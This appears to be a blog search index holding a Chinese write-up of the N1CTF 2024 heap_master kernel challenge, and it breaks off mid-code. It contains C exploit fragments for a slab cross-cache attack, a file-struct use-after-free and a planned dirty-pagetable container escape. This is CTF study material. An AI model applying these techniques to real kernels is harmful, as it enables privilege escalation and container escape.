<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>file uaf - N1CTF 2024 heap_master</title>
      <link href="/2024/11/12/fileuaf/"/>
      <url>/2024/11/12/fileuaf/</url>
      
        <content type="html"><![CDATA[<h2 id="写在一切之前"><a href="#写在一切之前" class="headerlink" title="写在一切之前"></a>写在一切之前</h2><p>不得不说 N1CTF 的题目质量是真的高，下次出题我也要出好一点（其实已经出好了，不过打算花多点时间去优化😋😋，敬请期待）。这次比赛有两题我觉得非常有意思，一题是 heap_master，另外一题是 php_master。其中 php_master 当时并没有做出来，打算以后有时间再研究一下（出题人的预期解是拿到任意反序列化，可是有的师傅认为这道题目其实可以拿到 code exec），感觉如何突破 php 新加的 shadow heap 将会是一个热点。</p><h2 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h2><p><font style="color:rgb(66, 75, 93);">我们都知道内核对物理内存的管理是按照页为基本单位进行的，进程运行起来所需要的数据也是存储在一个一个的物理页中，既然物理内存页可以存储进程的普通数据，那么它也一定可以存储进程虚拟内存与物理内存之间的映射关系。</font></p><p><font style="color:rgb(66, 75, 93);">事实上，内核也是这么干的，内核会从物理内存空间中拿出一个物理内存页来专门存储进程里的这些内存映射关系，而这种物理内存页我们将其称之为页表，从这里可以看出页表的本质其实就是一个物理内存页。</font></p><p><font style="color:rgb(66, 75, 93);">而内核会在页表中划分出来一个个大小相等的小内存块，这些小内存块我们称之为页表项 PTE（Page Table Entry），正是这个 PTE 保存了进程虚拟内存空间中的虚拟页与物理内存页的映射关系，以及控制物理内存访问的相关权限位。</font></p><p><font style="color:rgb(66, 75, 93);">因为内存映射的粒度是按照页为单位进行的，所以进程虚拟内存空间中的每个虚拟页在页表中都会有一个 PTE 与之对应，而虚拟页背后映射的物理内存页的起始地址就保存在 PTE 中。PTE 将会在我们后续的攻击中扮演重要的角色。</font></p><img src="/2024/11/12/fileuaf/1.png" class="" title="我的图图呢">  <h2 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a><font style="color:rgb(66, 75, 93);">漏洞分析与利用</font></h2><p>由于代码量比较少，这里直接贴上 ida 的外代码</p><p>safenote_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">safenote_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v0 = misc_register(&amp;safenote_device);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2B1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = kmem_cache_create(<span class="string">&quot;safenote&quot;</span>, <span class="number">0xC0</span>LL, <span class="number">0LL</span>, <span class="number">0x4052000</span>LL, <span class="number">0LL</span>);</span><br><span class="line">    note_kcache = (kmem_cache *)v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(<span class="type">unsigned</span> __int16 *)(v1 + <span class="number">0x34</span>);</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">0x2C</span>) = <span class="number">0x34</span>;</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">0x30</span>) = (v2 + <span class="number">0x67</span>) / v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="number">-12</span>;</span><br><span class="line">      printk(&amp;unk_308);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_open</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">safenote_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( already_open )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFF0</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))safenote_open_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">safenote_ioctl</span><span class="params">(file *f, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">u_int32_t</span> heap_idx; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;ioc_arg, v3, <span class="number">4LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1338</span> )                          <span class="comment">// free</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      kfree();</span><br><span class="line">      note[ioc_arg.heap_idx] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1339</span> )                          <span class="comment">// uaf</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !backdoor_used &amp;&amp; ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      kfree();</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">      backdoor_used = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    heap_idx = ioc_arg.heap_idx;</span><br><span class="line">    <span class="keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> &amp;&amp; !note[ioc_arg.heap_idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      note[heap_idx] = (<span class="type">char</span> *)kmem_cache_alloc(note_kcache, <span class="number">0x400CC0</span>LL, ioc_arg.heap_idx);</span><br><span class="line">      <span class="keyword">if</span> ( note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-12LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_close</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">safenote_close</span><span class="params">(inode *inodep, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inodep, filp);</span><br><span class="line">  --already_open;</span><br><span class="line">  printk(&amp;unk_297);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见出题人自己创建了一个 kmem_cache 并且后面的菜单堆都会从该 kmem_cache 中申请 object，而且题目白给了一次 double free 的机会。根据经验，我们自然而然的就会想到第一步要先让 uaf 的 object 对应的 slab 进入到 cross cache 中，至于要怎么进下面这篇文章已经写的非常清楚，这里不再赘：<a href="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/">Cross Cache Attack技术细节分析</a></p><p>我们可以看到出题人为这个新的 kmem_cache 自定义了  cpu_partial  和 cpu_partial_slabs 的值</p><img src="/2024/11/12/fileuaf/2.png" class="" title="我的图图呢">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * slab info notecache</span><br><span class="line"> * order: 0, object_size: 192</span><br><span class="line"> * cpu_partial: 52</span><br><span class="line"> * objs_per_slab: 16</span><br><span class="line"> * cpu_partial_slabs: 7</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>可以看到 cpu_partial 的值变得非常的大，如果我们要用上面链接那个做法至少需要申请 <code>2*objs_per_slab*(cpu_partial+1) = 0x6a0</code> 个堆块，而在菜单堆中我们最多同时拥有 0x100 个堆块，所以上文的方法在这里是行不通的，可是这里有个非预期 😋。</p><p>我们发现这道题目的 kernel 版本为 6.1.110</p><img src="/2024/11/12/fileuaf/3.png" class="" title="我的图图呢">  <p>我们查看当前版本的 put_cpu_partial 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cpu_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab, <span class="type">int</span> drain)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">oldslab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab_to_unfreeze</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="type">int</span> slabs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">oldslab = this_cpu_read(s-&gt;cpu_slab-&gt;partial);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldslab) &#123;</span><br><span class="line"><span class="keyword">if</span> (drain &amp;&amp; oldslab-&gt;slabs &gt;= s-&gt;cpu_partial_slabs) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Partial array is full. Move the existing set to the</span></span><br><span class="line"><span class="comment"> * per node partial list. Postpone the actual unfreezing</span></span><br><span class="line"><span class="comment"> * outside of the critical section.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab_to_unfreeze = oldslab;</span><br><span class="line">oldslab = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">slabs = oldslab-&gt;slabs;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slabs++;</span><br><span class="line"></span><br><span class="line">slab-&gt;slabs = slabs;</span><br><span class="line">slab-&gt;next = oldslab;</span><br><span class="line"></span><br><span class="line">this_cpu_write(s-&gt;cpu_slab-&gt;partial, slab);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab_to_unfreeze) &#123;</span><br><span class="line">__unfreeze_partials(s, slab_to_unfreeze);</span><br><span class="line">stat(s, CPU_PARTIAL_DRAIN);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现当前版本的内核判断 slab 是否要被 buddy system 回收是与 cpu_partial_slabs 进行比较而不是 cpu_partial，而 cpu_partial_slabs 在当前环境里的值为 7，所以我们完全可以直接喷 7 个页的堆块（我喷了12个）然后申请出 uaf 的堆块最后再从头依次释放所有申请出来的堆块就能让 uaf 的堆块对应的 slab 给 buddy system 回收，我的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> uaf_index = <span class="number">0xc0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">    add(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == uaf_index)&#123;</span><br><span class="line">        uaf(uaf_index);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    del(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而出题人的预期解为：<font style="color:rgb(26, 32, 41);">在不同的 CPU 上执行添加和释放操作。具体来说，在 CPU0 上进行分配，然后在 CPU1 上释放。由于 CPU0 无法访问由 CPU1 管理的 freelist 或 partial slabs，这促使 CPU1 达到其 partial 阈值，触发 put_cpu_partial。</font></p><p><font style="color:rgb(26, 32, 41);">其实现代码如下：</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> safe_note_objs_per_slab = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line">info(<span class="string">&quot;dev_fd = %d&quot;</span>, dev_fd);</span><br><span class="line">info(<span class="string">&quot;allocate in cpu 0&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; safe_note_objs_per_slab; i++)&#123;</span><br><span class="line">add(i);</span><br><span class="line"><span class="keyword">if</span>(i == safe_note_objs_per_slab / <span class="number">2</span>)&#123;</span><br><span class="line">info(<span class="string">&quot;allocate at note[0]&quot;</span>);</span><br><span class="line">add(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;trigger backdoor int cpu 1 at note[0]&quot;</span>);</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br><span class="line">uaf(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; safe_note_objs_per_slab; i++)&#123;</span><br><span class="line">del(i);</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;Trigger done...&quot;</span>);</span><br><span class="line">info(<span class="string">&quot;Try to Spray at different cpu_slab to cross cache&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; NOTE_SIZE; j++)&#123;</span><br><span class="line">add(j);</span><br><span class="line">&#125;</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; NOTE_SIZE; j++)&#123;</span><br><span class="line">del(j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;Spray done...&quot;</span>);</span><br><span class="line">info(<span class="string">&quot;Try to cross cache to file&quot;</span>);</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(26, 32, 41);">不得不说这招确实有点牛逼的说（</font></p><p><font style="color:rgb(26, 32, 41);">这道题目在 kernel 的基础上套了一层容器逃逸，所以我们的目标最终是要能够实现任意 shellcode 执行或者 执行我们的 rop，但由于前者的限制更少一点，所以我们选择使用 shellcode，自然而然的我们也会想到 dirty pageTable这种打法。这种打法的原理很简单，就是修改我们在前置内容里面所提到的 PTE，进而能够实现内核上任意物理地址的读写。但是这里又有一个新问题，出题人编写的内核驱动并没有给我们读写 uaf 堆块的机会，这里我们选择使用 file 结构体，该结构体在当前版本的内核定义如下：</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span><span class="title">f_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">f_rcuhead</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_iocb_flags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span><span class="title">f_path</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span>*<span class="title">f_inode</span>;</span><span class="comment">/* cached value */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment"> * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">spinlock_t</span>f_lock;</span><br><span class="line"><span class="type">atomic_long_t</span>f_count;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_flags;</span><br><span class="line"><span class="type">fmode_t</span>f_mode;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">f_pos_lock</span>;</span></span><br><span class="line"><span class="type">loff_t</span>f_pos;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span><span class="title">f_owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">f_cred</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span><span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">u64f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line"><span class="type">void</span>*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line"><span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>*<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="type">errseq_t</span>f_wb_err;</span><br><span class="line"><span class="type">errseq_t</span>f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure><p>我们可以用 file 结构体去占位 uaf 的堆块，然后使用 kfree 释放该 file 结构体就会出现一个 file uaf。由于 file 结构体是使用 filp 进行单独管理的，所以我们这里还是要想办法让 file uaf 对应的 slab 给 buddy system 回收，这里我选用的方法依然是喷射大量的 file 结构体然后全部释放来解决。下一个问题就是如何在用户态知道哪个 file 给释放了，我这里使用的方法是：</p><ul><li>第一次喷射大量只读权限的文件</li><li>利用 kfree 释放其中一个 file 结构体</li><li>第二次喷射大量只写权限的文件</li><li>对向所以第一次喷射的文件写入数据，如果能够写入成功则说明该文件为 uaf 的文件。</li></ul><p>上述过程的流程图大致如下：</p><img src="/2024/11/12/fileuaf/4.png" class="" title="我的图图呢">  <p>上述过程的代码实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">info(<span class="string">&quot;spray read file.&quot;</span>);</span><br><span class="line"><span class="type">int</span> read_fd[READ_FD];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    read_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(read_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">del(uaf_index);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;spray write file.&quot;</span>);</span><br><span class="line"><span class="type">int</span> write_fd[WRITE_FD];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">    write_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(write_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;find the uaf read file&quot;</span>);</span><br><span class="line"><span class="type">int</span> uaf_read_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    <span class="type">int</span> ret = write(read_fd[i], buf, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] find the uaf read fd %d \n&quot;</span>, i);</span><br><span class="line">        uaf_read_fd = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(uaf_read_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;can not find the uaf read fd.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;close the file.&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">    close(tmp_fd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    <span 